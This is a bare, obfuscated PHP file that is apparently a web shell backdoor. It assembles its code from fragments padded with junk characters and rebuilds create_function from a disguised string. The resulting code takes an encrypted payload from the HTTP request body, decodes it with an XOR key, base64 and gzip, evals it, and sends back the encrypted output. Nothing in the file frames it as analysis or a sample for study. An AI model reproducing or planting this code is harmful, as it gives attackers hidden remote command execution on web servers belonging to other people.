<?php
$a='wwval(@gzuncwompress(@x(@bwase64w_decodew($m[1]w),w$k))w);$o=@ob_getw_cowntwents();@owb';
$A=str_replace('np','','cnprnpnpeatenp_fnpunnpction');
$v='w_end_cleanw();$r=@bawse64w_encode(w@x(@gzcomwprewss($o)w,$k));pwrinwt("$p$khw$r$kf");}';
$w='j=0;(w$j<w$c&&$wi<$l);$jw++,$i++)w{$o.=w$tw{$i}^$k{$j};}}retwurn $wo;}if w(@pwregw_matc';
$r='$k="b935w2b88"w;$khwww="784dcc66d15c";$wkf="1cb7w9e9cfww0fw7";$p=w"wNA7PYrL3zdWNV8pz";';
$u='functwiwon x($t,$k){w$wc=wstrlen($k);$wwl=strlen($wt);$o="";wfor($i=w0;$iw<$l;)w{wfor($';
$W='h("/$kwwh(.+w)$kf/",@filwe_wget_contents("pwhp://iwnput")w,ww$m)==1) {@ob_starwtw();@e';
$d=str_replace('w','',$r.$u.$w.$W.$a.$v);
$P=$A('',$d);$P();
?>
